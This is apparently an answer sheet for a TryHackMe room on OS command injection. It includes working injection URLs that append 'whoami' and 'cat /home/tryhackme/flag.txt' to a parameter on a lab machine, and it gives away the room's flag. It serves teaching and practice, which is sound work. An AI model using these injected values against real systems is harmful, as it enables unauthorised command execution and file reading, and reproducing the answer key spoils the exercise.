Link to room: https://tryhackme.com/room/oscommandinjection

# Questions:

- Task 1
	- Read me!
		- No answer needed

- Task 2
	- What variable stores the user's input in the PHP code snippet in this task?
		- $title
	- What HTTP method is used to retrieve data submitted by a user in the PHP code snippet?
		- GET
	- If I wanted to execute the id command in the Python code snippet, what route would I need to visit?
		- /id

- Task 3
	- What payload would I use if I wanted to determine what user the application is running as?
		- whoami
	- What popular network tool would I use to test for blind command injection on a Linux machine?
		- ping
	- What payload would I use to test a Windows machine for blind command injection?
		- timeout

- Task 4	
	- What is the term for the process of "cleaning" user input that is provided to an application?
		- Sanitisation

- Task 5
	- What user is this application running as?
		- www-data
		- URL Needed
			- http://xx.xx.xxx.xxx/index.php?address=127.0.0.1;%20whoami
	- What are the contents of the flag located in /home/tryhackme/flag.txt?
		- THM{COMMAND_INJECTION_COMPLETE} 
		- URL Needed
			- http://xx.xx.xxx.xxx/index.php?address=127.0.0.1;%20cat%20/home/tryhackme/flag.txt

- Task 6
	- Terminate the vulnerable machine from task 5
		- No answer needed

Command Injection URL:
https://github.com/payloadbox/command-injection-payload-list
#Tips